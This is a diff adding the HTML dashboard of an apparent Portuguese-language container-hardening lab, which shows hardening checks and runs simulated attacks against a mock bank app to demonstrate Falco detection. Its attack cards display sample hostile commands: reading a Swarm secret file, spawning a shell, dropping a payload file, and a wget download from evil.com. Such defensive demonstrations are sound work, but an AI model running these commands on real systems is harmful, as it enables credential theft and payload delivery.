@@ -1,0 +1,847 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SOC Dashboard — Container Hardening Lab</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#128737;</text></svg>">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap');
+
+        :root {
+            --bg-primary: #06090f;
+            --bg-secondary: #0c1018;
+            --bg-card: #111827;
+            --bg-card-hover: #1a2236;
+            --bg-elevated: #1e293b;
+            --border: #1e2d3d;
+            --border-hover: #2d4a65;
+            --text-primary: #e2e8f0;
+            --text-secondary: #94a3b8;
+            --text-muted: #475569;
+            --green: #10b981;
+            --green-dim: rgba(16,185,129,0.12);
+            --green-glow: rgba(16,185,129,0.25);
+            --red: #ef4444;
+            --red-dim: rgba(239,68,68,0.12);
+            --red-glow: rgba(239,68,68,0.3);
+            --yellow: #f59e0b;
+            --yellow-dim: rgba(245,158,11,0.12);
+            --blue: #3b82f6;
+            --blue-dim: rgba(59,130,246,0.12);
+            --purple: #8b5cf6;
+            --cyan: #06b6d4;
+            --cyan-dim: rgba(6,182,212,0.12);
+            --mono: 'JetBrains Mono', 'Cascadia Code', 'Fira Code', monospace;
+            --sans: 'Inter', -apple-system, sans-serif;
+            --radius: 14px;
+            --radius-sm: 10px;
+        }
+
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: var(--sans);
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.5;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background:
+                radial-gradient(ellipse at 20% 0%, rgba(59,130,246,0.06) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 100%, rgba(139,92,246,0.04) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* ═══ TOP BAR ═══ */
+        .topbar {
+            background: rgba(6,9,15,0.85);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--border);
+            padding: 0 2rem;
+            height: 56px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 50;
+        }
+        .topbar-left { display: flex; align-items: center; gap: 14px; }
+        .topbar-logo {
+            width: 34px; height: 34px;
+            background: linear-gradient(135deg, var(--blue), var(--purple));
+            border-radius: 10px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 18px;
+            box-shadow: 0 0 20px rgba(59,130,246,0.2);
+        }
+        .topbar-title { font-size: 0.95rem; font-weight: 700; letter-spacing: -0.3px; }
+        .topbar-title span { color: var(--blue); }
+        .topbar-sep { color: var(--text-muted); font-weight: 300; }
+        .topbar-sub { color: var(--text-muted); font-size: 0.8rem; font-weight: 500; }
+        .topbar-right { display: flex; align-items: center; gap: 16px; }
+        .topbar-badge {
+            display: flex; align-items: center; gap: 7px;
+            padding: 5px 14px;
+            border-radius: 100px;
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+        .topbar-badge.online {
+            background: var(--green-dim);
+            color: var(--green);
+            border: 1px solid rgba(16,185,129,0.25);
+        }
+        .topbar-dot {
+            width: 7px; height: 7px; border-radius: 50%;
+            background: var(--green);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
+        .topbar-time { font-family: var(--mono); font-size: 0.8rem; color: var(--text-muted); }
+
+        /* ═══ LAYOUT ═══ */
+        .main { max-width: 1520px; margin: 0 auto; padding: 1.5rem 2rem; position: relative; z-index: 1; }
+
+        /* ═══ STATS ROW ═══ */
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(6, 1fr);
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+        .stat-chip {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: all 0.2s;
+        }
+        .stat-chip:hover { border-color: var(--border-hover); }
+        .stat-chip-icon {
+            width: 36px; height: 36px; border-radius: 8px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 1rem;
+        }
+        .stat-chip-label { font-size: 0.65rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; font-weight: 500; }
+        .stat-chip-value { font-size: 0.9rem; font-weight: 700; font-family: var(--mono); color: var(--cyan); margin-top: 1px; }
+
+        /* ═══ MAIN GRID ═══ */
+        .grid-main {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        /* ═══ CARDS ═══ */
+        .card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            overflow: hidden;
+            transition: border-color 0.2s;
+        }
+        .card:hover { border-color: var(--border-hover); }
+        .card-head {
+            padding: 16px 20px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .card-label {
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            color: var(--text-secondary);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .card-label-dot { width: 6px; height: 6px; border-radius: 50%; }
+        .card-body { padding: 20px; }
+
+        /* ═══ SCORE + CHECKS SPLIT ═══ */
+        .score-checks {
+            display: grid;
+            grid-template-columns: 220px 1fr;
+            gap: 0;
+        }
+        .score-panel {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            border-right: 1px solid var(--border);
+        }
+        .score-ring { position: relative; width: 150px; height: 150px; margin-bottom: 12px; }
+        .score-ring svg { transform: rotate(-90deg); width: 150px; height: 150px; }
+        .score-ring circle { fill: none; stroke-width: 8; stroke-linecap: round; }
+        .score-ring .ring-bg { stroke: var(--border); }
+        .score-ring .ring-fill {
+            stroke: var(--green);
+            stroke-dasharray: 408;
+            stroke-dashoffset: 408;
+            transition: stroke-dashoffset 1.5s ease-out;
+            filter: drop-shadow(0 0 8px var(--green-glow));
+        }
+        .score-ring .ring-fill.warning { stroke: var(--yellow); filter: drop-shadow(0 0 8px rgba(245,158,11,0.3)); }
+        .score-ring .ring-fill.danger { stroke: var(--red); filter: drop-shadow(0 0 8px var(--red-glow)); }
+        .score-value {
+            position: absolute; top: 50%; left: 50%;
+            transform: translate(-50%,-50%);
+            font-size: 2.2rem; font-weight: 800; font-family: var(--mono);
+        }
+        .score-sub { font-size: 0.75rem; color: var(--text-muted); text-align: center; }
+
+        .checks-panel { padding: 16px 20px; overflow-y: auto; max-height: 360px; }
+        .checks-panel::-webkit-scrollbar { width: 4px; }
+        .checks-panel::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+        .check-item {
+            display: flex; align-items: center; gap: 12px;
+            padding: 11px 14px;
+            border-radius: var(--radius-sm);
+            transition: background 0.15s;
+            border: 1px solid transparent;
+        }
+        .check-item:hover { background: var(--bg-card-hover); border-color: var(--border); }
+        .check-icon {
+            width: 34px; height: 34px; border-radius: 8px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 0.95rem; flex-shrink: 0;
+        }
+        .check-icon.pass { background: var(--green-dim); color: var(--green); }
+        .check-icon.fail { background: var(--red-dim); color: var(--red); }
+        .check-icon.warn { background: var(--yellow-dim); color: var(--yellow); }
+        .check-info { flex: 1; min-width: 0; }
+        .check-name { font-size: 0.82rem; font-weight: 600; }
+        .check-desc { font-size: 0.7rem; color: var(--text-muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .check-tag {
+            padding: 3px 9px; border-radius: 100px;
+            font-size: 0.62rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.04em; flex-shrink: 0;
+        }
+        .check-tag.pass { background: var(--green-dim); color: var(--green); }
+        .check-tag.fail { background: var(--red-dim); color: var(--red); }
+        .check-tag.warn { background: var(--yellow-dim); color: var(--yellow); }
+
+        /* ═══ TARGET PREVIEW ═══ */
+        .target-frame {
+            width: 100%; height: 340px; border: none; border-radius: 0;
+            background: #0f1117;
+        }
+        .target-url {
+            display: flex; align-items: center; gap: 8px;
+            padding: 8px 14px;
+            background: var(--bg-secondary);
+            border-bottom: 1px solid var(--border);
+            font-family: var(--mono); font-size: 0.7rem; color: var(--text-muted);
+        }
+        .target-url-dot { width: 8px; height: 8px; border-radius: 50%; }
+        .target-url a { color: var(--cyan); text-decoration: none; }
+        .target-url a:hover { text-decoration: underline; }
+
+        /* ═══ ATTACK SECTION ═══ */
+        .attack-section { margin-bottom: 1.5rem; }
+        .attack-section-head {
+            display: flex; align-items: center; justify-content: space-between;
+            margin-bottom: 1rem;
+        }
+        .attack-section-title {
+            font-size: 1.1rem; font-weight: 700; letter-spacing: -0.3px;
+            display: flex; align-items: center; gap: 10px;
+        }
+        .attack-section-title .badge-count {
+            background: var(--red-dim); color: var(--red);
+            padding: 3px 10px; border-radius: 100px;
+            font-size: 0.7rem; font-weight: 700;
+        }
+        .attacks-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 1rem;
+        }
+        .attack-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 0;
+            cursor: pointer;
+            transition: all 0.25s;
+            overflow: hidden;
+            position: relative;
+        }
+        .attack-card::before {
+            content: '';
+            position: absolute; top: 0; left: 0; right: 0; height: 3px;
+            background: linear-gradient(90deg, var(--red), transparent);
+            opacity: 0;
+            transition: opacity 0.25s;
+        }
+        .attack-card:hover {
+            border-color: var(--red);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 30px rgba(239,68,68,0.12);
+        }
+        .attack-card:hover::before { opacity: 1; }
+        .attack-card.running {
+            border-color: var(--yellow);
+            box-shadow: 0 0 25px rgba(245,158,11,0.15);
+            animation: card-pulse 0.8s infinite;
+        }
+        @keyframes card-pulse {
+            0%,100% { box-shadow: 0 0 15px rgba(245,158,11,0.1); }
+            50% { box-shadow: 0 0 30px rgba(245,158,11,0.2); }
+        }
+        .attack-card-top { padding: 20px 18px 14px; }
+        .attack-card-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; }
+        .attack-card-icon {
+            width: 42px; height: 42px; border-radius: 10px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 1.2rem;
+            background: var(--red-dim);
+        }
+        .attack-severity {
+            padding: 3px 9px; border-radius: 100px;
+            font-size: 0.6rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em;
+        }
+        .attack-severity.critical { background: var(--red-dim); color: var(--red); }
+        .attack-severity.warning { background: var(--yellow-dim); color: var(--yellow); }
+        .attack-card-name { font-size: 0.9rem; font-weight: 700; margin-bottom: 4px; }
+        .attack-card-desc { font-size: 0.72rem; color: var(--text-muted); line-height: 1.4; margin-bottom: 12px; }
+        .attack-card-cmd {
+            font-family: var(--mono); font-size: 0.68rem; color: var(--text-secondary);
+            background: var(--bg-secondary); padding: 8px 12px;
+            border-radius: 6px; margin-bottom: 0;
+            display: flex; align-items: center; gap: 6px;
+        }
+        .attack-card-cmd .prompt { color: var(--red); font-weight: 600; }
+        .attack-card-bottom {
+            padding: 12px 18px;
+            border-top: 1px solid var(--border);
+            display: flex; align-items: center; justify-content: space-between;
+            background: rgba(0,0,0,0.15);
+        }
+        .attack-card-mitre { font-size: 0.65rem; color: var(--text-muted); font-family: var(--mono); }
+        .attack-card-btn {
+            font-size: 0.7rem; font-weight: 600; color: var(--red);
+            display: flex; align-items: center; gap: 4px;
+            transition: gap 0.2s;
+        }
+        .attack-card:hover .attack-card-btn { gap: 8px; }
+
+        /* ═══ ATTACK RESULT PANEL ═══ */
+        .attack-result {
+            display: none;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            margin-bottom: 1.5rem;
+            overflow: hidden;
+            animation: result-in 0.4s ease-out;
+        }
+        .attack-result.active { display: block; }
+        @keyframes result-in { from { opacity:0; transform:translateY(-10px); } to { opacity:1; transform:translateY(0); } }
+        .result-bar {
+            display: flex; align-items: center; gap: 12px;
+            padding: 16px 20px;
+        }
+        .result-bar.blocked { background: linear-gradient(90deg, var(--green-dim), transparent); border-bottom: 1px solid rgba(16,185,129,0.2); }
+        .result-bar.not-blocked { background: linear-gradient(90deg, var(--red-dim), transparent); border-bottom: 1px solid rgba(239,68,68,0.2); }
+        .result-status-icon { font-size: 1.5rem; }
+        .result-status-text h3 { font-size: 1rem; font-weight: 700; }
+        .result-status-text p { font-size: 0.78rem; color: var(--text-secondary); }
+        .result-grid {
+            display: grid; grid-template-columns: repeat(4, 1fr);
+            gap: 1px;
+            background: var(--border);
+        }
+        .result-cell {
+            padding: 16px 18px;
+            background: var(--bg-card);
+        }
+        .result-cell-label { font-size: 0.65rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 6px; }
+        .result-cell-value { font-size: 0.8rem; font-family: var(--mono); color: var(--text-primary); line-height: 1.5; }
+        .result-close {
+            display: flex; align-items: center; justify-content: center;
+            padding: 10px;
+            background: var(--bg-secondary); border: none;
+            color: var(--text-muted); cursor: pointer;
+            font-family: var(--sans); font-size: 0.75rem; font-weight: 600;
+            transition: color 0.15s;
+        }
+        .result-close:hover { color: var(--text-primary); }
+
+        /* ═══ EVENT LOG ═══ */
+        .log-section {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            overflow: hidden;
+            margin-bottom: 1.5rem;
+        }
+        .log-head {
+            padding: 14px 20px;
+            border-bottom: 1px solid var(--border);
+            display: flex; align-items: center; justify-content: space-between;
+        }
+        .log-title {
+            font-size: 0.75rem; font-weight: 600; text-transform: uppercase;
+            letter-spacing: 0.06em; color: var(--text-secondary);
+            display: flex; align-items: center; gap: 8px;
+        }
+        .log-count { font-size: 0.7rem; color: var(--text-muted); font-family: var(--mono); }
+        .log-terminal {
+            background: var(--bg-secondary);
+            padding: 4px 0;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: var(--mono);
+            font-size: 0.75rem;
+        }
+        .log-terminal::-webkit-scrollbar { width: 4px; }
+        .log-terminal::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+        .log-line {
+            display: flex; align-items: flex-start; gap: 0;
+            padding: 6px 16px;
+            transition: background 0.1s;
+            animation: log-in 0.25s ease-out;
+        }
+        .log-line:hover { background: rgba(255,255,255,0.02); }
+        @keyframes log-in { from { opacity:0; } to { opacity:1; } }
+        .log-time { color: var(--text-muted); width: 72px; flex-shrink: 0; }
+        .log-level {
+            width: 72px; flex-shrink: 0; font-weight: 700; text-transform: uppercase; font-size: 0.68rem; padding-top: 1px;
+        }
+        .log-level.info { color: var(--blue); }
+        .log-level.warn, .log-level.warning { color: var(--yellow); }
+        .log-level.critical { color: var(--red); }
+        .log-msg { color: var(--text-secondary); flex: 1; }
+        .log-msg strong { color: var(--text-primary); font-weight: 600; }
+        .log-empty { padding: 40px; text-align: center; color: var(--text-muted); }
+
+        /* ═══ FOOTER ═══ */
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            border-top: 1px solid var(--border);
+        }
+        .footer a { color: var(--blue); text-decoration: none; }
+
+        /* ═══ RESPONSIVE ═══ */
+        @media (max-width: 1200px) {
+            .attacks-grid { grid-template-columns: repeat(2, 1fr); }
+            .result-grid { grid-template-columns: repeat(2, 1fr); }
+            .stats-row { grid-template-columns: repeat(3, 1fr); }
+        }
+        @media (max-width: 768px) {
+            .grid-main { grid-template-columns: 1fr; }
+            .score-checks { grid-template-columns: 1fr; }
+            .score-panel { border-right: none; border-bottom: 1px solid var(--border); }
+            .attacks-grid { grid-template-columns: 1fr; }
+            .result-grid { grid-template-columns: 1fr; }
+            .stats-row { grid-template-columns: repeat(2, 1fr); }
+            .topbar { padding: 0 1rem; }
+            .main { padding: 1rem; }
+        }
+    </style>
+</head>
+<body>
+    <!-- ═══ TOP BAR ═══ -->
+    <div class="topbar">
+        <div class="topbar-left">
+            <div class="topbar-logo">&#128737;</div>
+            <span class="topbar-title">Security <span>Operations</span></span>
+            <span class="topbar-sep">|</span>
+            <span class="topbar-sub">Container Hardening Lab</span>
+        </div>
+        <div class="topbar-right">
+            <div class="topbar-badge online" id="status-badge">
+                <div class="topbar-dot"></div>
+                <span>Carregando...</span>
+            </div>
+            <span class="topbar-time" id="clock"></span>
+        </div>
+    </div>
+
+    <div class="main">
+        <!-- ═══ STATS ROW ═══ -->
+        <div class="stats-row" id="stats-row">
+            <div class="stat-chip">
+                <div class="stat-chip-icon" style="background:var(--cyan-dim);color:var(--cyan);">&#128100;</div>
+                <div>
+                    <div class="stat-chip-label">UID</div>
+                    <div class="stat-chip-value" id="s-uid">—</div>
+                </div>
+            </div>
+            <div class="stat-chip">
+                <div class="stat-chip-icon" style="background:var(--blue-dim);color:var(--blue);">&#9881;</div>
+                <div>
+                    <div class="stat-chip-label">PID</div>
+                    <div class="stat-chip-value" id="s-pid">—</div>
+                </div>
+            </div>
+            <div class="stat-chip">
+                <div class="stat-chip-icon" style="background:var(--purple);color:#fff;background:rgba(139,92,246,0.15);color:var(--purple);">&#128421;</div>
+                <div>
+                    <div class="stat-chip-label">Hostname</div>
+                    <div class="stat-chip-value" id="s-host">—</div>
+                </div>
+            </div>
+            <div class="stat-chip">
+                <div class="stat-chip-icon" style="background:var(--green-dim);color:var(--green);">&#128013;</div>
+                <div>
+                    <div class="stat-chip-label">Python</div>
+                    <div class="stat-chip-value" id="s-python">—</div>
+                </div>
+            </div>
+            <div class="stat-chip">
+                <div class="stat-chip-icon" style="background:var(--yellow-dim);color:var(--yellow);">&#9201;</div>
+                <div>
+                    <div class="stat-chip-label">Uptime</div>
+                    <div class="stat-chip-value" id="s-uptime">—</div>
+                </div>
+            </div>
+            <div class="stat-chip">
+                <div class="stat-chip-icon" style="background:var(--red-dim);color:var(--red);">&#128274;</div>
+                <div>
+                    <div class="stat-chip-label">Secret</div>
+                    <div class="stat-chip-value" id="s-secret">—</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ═══ SCORE/CHECKS + TARGET PREVIEW ═══ -->
+        <div class="grid-main">
+            <div class="card">
+                <div class="card-head">
+                    <div class="card-label">
+                        <div class="card-label-dot" style="background:var(--green)"></div>
+                        Hardening Status
+                    </div>
+                    <span id="checks-count" style="font-size:0.7rem;color:var(--text-muted);font-family:var(--mono);">—</span>
+                </div>
+                <div class="score-checks">
+                    <div class="score-panel">
+                        <div class="score-ring">
+                            <svg viewBox="0 0 140 140">
+                                <circle class="ring-bg" cx="70" cy="70" r="65"></circle>
+                                <circle class="ring-fill" id="score-ring" cx="70" cy="70" r="65"></circle>
+                            </svg>
+                            <div class="score-value" id="score-value">—</div>
+                        </div>
+                        <div class="score-sub" id="score-sub">Carregando...</div>
+                    </div>
+                    <div class="checks-panel" id="checks-list"></div>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-head">
+                    <div class="card-label">
+                        <div class="card-label-dot" style="background:var(--cyan)"></div>
+                        Target: NexBank
+                    </div>
+                    <span style="font-size:0.7rem;color:var(--text-muted);">Aplicação monitorada</span>
+                </div>
+                <div class="target-url">
+                    <div class="target-url-dot" style="background:var(--green)"></div>
+                    <span>&#128274;</span>
+                    <a href="/site" target="_blank">https://nexbank.app/dashboard</a>
+                    <span style="margin-left:auto;font-size:0.65rem;">Abrir em nova aba &#8599;</span>
+                </div>
+                <iframe src="/site" class="target-frame" id="target-iframe" loading="lazy"></iframe>
+            </div>
+        </div>
+
+        <!-- ═══ ATTACK RESULT PANEL ═══ -->
+        <div class="attack-result" id="attack-result">
+            <div class="result-bar" id="result-bar">
+                <div class="result-status-icon" id="result-icon">&#128737;</div>
+                <div class="result-status-text">
+                    <h3 id="result-title">—</h3>
+                    <p id="result-subtitle">—</p>
+                </div>
+            </div>
+            <div class="result-grid">
+                <div class="result-cell">
+                    <div class="result-cell-label">Comando Executado</div>
+                    <div class="result-cell-value" id="r-attack">—</div>
+                </div>
+                <div class="result-cell">
+                    <div class="result-cell-label">Regra Falco</div>
+                    <div class="result-cell-value" id="r-rule">—</div>
+                </div>
+                <div class="result-cell">
+                    <div class="result-cell-label">MITRE ATT&amp;CK</div>
+                    <div class="result-cell-value" id="r-mitre">—</div>
+                </div>
+                <div class="result-cell">
+                    <div class="result-cell-label">Detalhe</div>
+                    <div class="result-cell-value" id="r-detail">—</div>
+                </div>
+            </div>
+            <button class="result-close" onclick="document.getElementById('attack-result').classList.remove('active')">Fechar resultado</button>
+        </div>
+
+        <!-- ═══ ATTACK CARDS ═══ -->
+        <div class="attack-section">
+            <div class="attack-section-head">
+                <div class="attack-section-title">
+                    &#9889; Simulação de Ataques
+                    <span class="badge-count">4 vetores</span>
+                </div>
+                <span style="font-size:0.75rem;color:var(--text-muted);">Clique em um card para lançar a simulação</span>
+            </div>
+            <div class="attacks-grid">
+                <div class="attack-card" onclick="runAttack('read-secret', this)">
+                    <div class="attack-card-top">
+                        <div class="attack-card-header">
+                            <div class="attack-card-icon">&#128373;</div>
+                            <span class="attack-severity critical">Critical</span>
+                        </div>
+                        <div class="attack-card-name">Roubo de Credenciais</div>
+                        <div class="attack-card-desc">Tenta ler o secret do Swarm diretamente do filesystem protegido</div>
+                        <div class="attack-card-cmd"><span class="prompt">$</span> cat /run/secrets/db_password</div>
+                    </div>
+                    <div class="attack-card-bottom">
+                        <span class="attack-card-mitre">T1552.001</span>
+                        <span class="attack-card-btn">Executar &#8594;</span>
+                    </div>
+                </div>
+
+                <div class="attack-card" onclick="runAttack('shell-spawn', this)">
+                    <div class="attack-card-top">
+                        <div class="attack-card-header">
+                            <div class="attack-card-icon">&#128187;</div>
+                            <span class="attack-severity warning">Warning</span>
+                        </div>
+                        <div class="attack-card-name">Shell Interativo</div>
+                        <div class="attack-card-desc">Abre um shell dentro do container — indicador clássico de comprometimento</div>
+                        <div class="attack-card-cmd"><span class="prompt">$</span> docker exec &lt;id&gt; sh</div>
+                    </div>
+                    <div class="attack-card-bottom">
+                        <span class="attack-card-mitre">T1059</span>
+                        <span class="attack-card-btn">Executar &#8594;</span>
+                    </div>
+                </div>
+
+                <div class="attack-card" onclick="runAttack('write-filesystem', this)">
+                    <div class="attack-card-top">
+                        <div class="attack-card-header">
+                            <div class="attack-card-icon">&#128190;</div>
+                            <span class="attack-severity critical">Critical</span>
+                        </div>
+                        <div class="attack-card-name">Dropper de Malware</div>
+                        <div class="attack-card-desc">Tenta gravar payload malicioso no filesystem read-only do container</div>
+                        <div class="attack-card-cmd"><span class="prompt">$</span> echo 'payload' > /app/mal.sh</div>
+                    </div>
+                    <div class="attack-card-bottom">
+                        <span class="attack-card-mitre">T1105</span>
+                        <span class="attack-card-btn">Executar &#8594;</span>
+                    </div>
+                </div>
+
+                <div class="attack-card" onclick="runAttack('network-tool', this)">
+                    <div class="attack-card-top">
+                        <div class="attack-card-header">
+                            <div class="attack-card-icon">&#127760;</div>
+                            <span class="attack-severity critical">Critical</span>
+                        </div>
+                        <div class="attack-card-name">Exfiltração de Dados</div>
+                        <div class="attack-card-desc">Tenta usar ferramentas de rede removidas para baixar payload externo</div>
+                        <div class="attack-card-cmd"><span class="prompt">$</span> wget http://evil.com/payload</div>
+                    </div>
+                    <div class="attack-card-bottom">
+                        <span class="attack-card-mitre">T1105</span>
+                        <span class="attack-card-btn">Executar &#8594;</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ═══ EVENT LOG ═══ -->
+        <div class="log-section">
+            <div class="log-head">
+                <div class="log-title">
+                    <div class="card-label-dot" style="background:var(--yellow)"></div>
+                    Security Event Log
+                </div>
+                <span class="log-count" id="log-count">0 eventos</span>
+            </div>
+            <div class="log-terminal" id="log-terminal">
+                <div class="log-empty">Nenhum evento registrado. Lance um ataque para ver o log em ação.</div>
+            </div>
+        </div>
+
+        <footer class="footer">
+            Container Hardening &amp; Monitoring Lab &mdash;
+            Docker Swarm &bull; Falco &bull; Flask &bull; MITRE ATT&amp;CK &mdash;
+            <a href="https://github.com/seu-usuario/container-hardening-lab" target="_blank">GitHub Repository</a>
+        </footer>
+    </div>
+
+    <script>
+        const ICONS = {
+            'user-shield':'&#128110;','hard-drive':'&#128430;','lock':'&#128274;',
+            'terminal':'&#128187;','wifi-off':'&#128268;','box':'&#128230;',
+        };
+
+        // Clock
+        function updateClock() {
+            const now = new Date();
+            document.getElementById('clock').textContent =
+                now.toLocaleTimeString('pt-BR',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
+        }
+        updateClock();
+        setInterval(updateClock, 1000);
+
+        // Load dashboard
+        async function loadDashboard() {
+            try {
+                const res = await fetch('/api/status');
+                const data = await res.json();
+                updateStats(data.container, data.secret);
+                updateScore(data.hardening);
+                updateChecks(data.hardening.checks);
+                updateEvents(data.events);
+                updateBadge(data.hardening.score);
+            } catch (err) {
+                console.error('Dashboard error:', err);
+            }
+        }
+
+        function updateStats(c, s) {
+            document.getElementById('s-uid').textContent = c.uid;
+            document.getElementById('s-pid').textContent = c.pid;
+            document.getElementById('s-host').textContent = c.hostname;
+            document.getElementById('s-python').textContent = c.python;
+            document.getElementById('s-uptime').textContent = c.uptime;
+            document.getElementById('s-secret').textContent = s.available ? s.masked : 'N/A';
+        }
+
+        function updateScore(h) {
+            const ring = document.getElementById('score-ring');
+            const circ = 2 * Math.PI * 65;
+            const offset = circ - (h.score / 100) * circ;
+            ring.style.strokeDasharray = circ;
+            ring.style.strokeDashoffset = offset;
+            ring.classList.remove('warning','danger');
+            if (h.score < 50) ring.classList.add('danger');
+            else if (h.score < 80) ring.classList.add('warning');
+            document.getElementById('score-value').textContent = h.score + '%';
+            document.getElementById('score-sub').textContent = h.passed + '/' + h.total + ' checks aprovados';
+            document.getElementById('checks-count').textContent = h.passed + '/' + h.total;
+        }
+
+        function updateChecks(checks) {
+            document.getElementById('checks-list').innerHTML = checks.map(c => `
+                <div class="check-item">
+                    <div class="check-icon ${c.status}">${ICONS[c.icon]||'&#9679;'}</div>
+                    <div class="check-info">
+                        <div class="check-name">${c.name}</div>
+                        <div class="check-desc" title="${c.detail}">${c.detail}</div>
+                    </div>
+                    <span class="check-tag ${c.status}">${c.status==='pass'?'OK':c.status==='fail'?'FAIL':'WARN'}</span>
+                </div>`).join('');
+        }
+
+        function updateBadge(score) {
+            const b = document.getElementById('status-badge');
+            if (score >= 80) {
+                b.innerHTML = '<div class="topbar-dot"></div><span>Protegido</span>';
+                b.className = 'topbar-badge online';
+            } else if (score >= 50) {
+                b.innerHTML = '<div class="topbar-dot" style="background:var(--yellow)"></div><span>Parcial</span>';
+                b.style.background = 'var(--yellow-dim)'; b.style.color = 'var(--yellow)';
+                b.style.borderColor = 'rgba(245,158,11,0.25)';
+            } else {
+                b.innerHTML = '<div class="topbar-dot" style="background:var(--red)"></div><span>Vulnerável</span>';
+                b.style.background = 'var(--red-dim)'; b.style.color = 'var(--red)';
+                b.style.borderColor = 'rgba(239,68,68,0.25)';
+            }
+        }
+
+        function updateEvents(events) {
+            const el = document.getElementById('log-terminal');
+            const ct = document.getElementById('log-count');
+            ct.textContent = events.length + ' evento' + (events.length !== 1 ? 's' : '');
+            if (!events.length) {
+                el.innerHTML = '<div class="log-empty">Nenhum evento registrado. Lance um ataque para ver o log.</div>';
+                return;
+            }
+            el.innerHTML = [...events].reverse().map(e => `
+                <div class="log-line">
+                    <span class="log-time">${e.timestamp}</span>
+                    <span class="log-level ${e.level}">${e.level}</span>
+                    <span class="log-msg"><strong>${e.title}</strong> — ${e.detail}</span>
+                </div>`).join('');
+            el.scrollTop = 0;
+        }
+
+        // Attack simulation
+        async function runAttack(type, cardEl) {
+            document.querySelectorAll('.attack-card').forEach(c => c.classList.remove('running'));
+            if (cardEl) cardEl.classList.add('running');
+
+            // Notify target site iframe
+            const iframe = document.getElementById('target-iframe');
+            if (iframe && iframe.contentWindow) {
+                iframe.contentWindow.postMessage({type:'attack', name: type}, '*');
+            }
+
+            try {
+                const res = await fetch('/api/simulate/' + type);
+                const data = await res.json();
+                showResult(data);
+                const evRes = await fetch('/api/events');
+                const evData = await evRes.json();
+                updateEvents(evData.events);
+            } catch (err) {
+                console.error('Attack error:', err);
+            } finally {
+                setTimeout(() => {
+                    document.querySelectorAll('.attack-card').forEach(c => c.classList.remove('running'));
+                }, 600);
+            }
+        }
+
+        function showResult(d) {
+            const panel = document.getElementById('attack-result');
+            const bar = document.getElementById('result-bar');
+
+            bar.className = 'result-bar ' + (d.blocked ? 'blocked' : 'not-blocked');
+            document.getElementById('result-icon').textContent = d.blocked ? '&#9989;' : '&#9888;';
+            document.getElementById('result-title').textContent =
+                d.blocked ? 'Ataque Bloqueado / Detectado' : 'ALERTA: Proteção Insuficiente!';
+            document.getElementById('result-subtitle').textContent = d.severity;
+            document.getElementById('r-attack').textContent = d.attack;
+            document.getElementById('r-rule').textContent = d.falco_rule;
+            document.getElementById('r-mitre').textContent = d.mitre;
+            document.getElementById('r-detail').textContent = d.detail;
+
+            panel.classList.add('active');
+            panel.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        }
+
+        // Init
+        loadDashboard();
+        setInterval(loadDashboard, 10000);
+    </script>
+</body>
+</html>
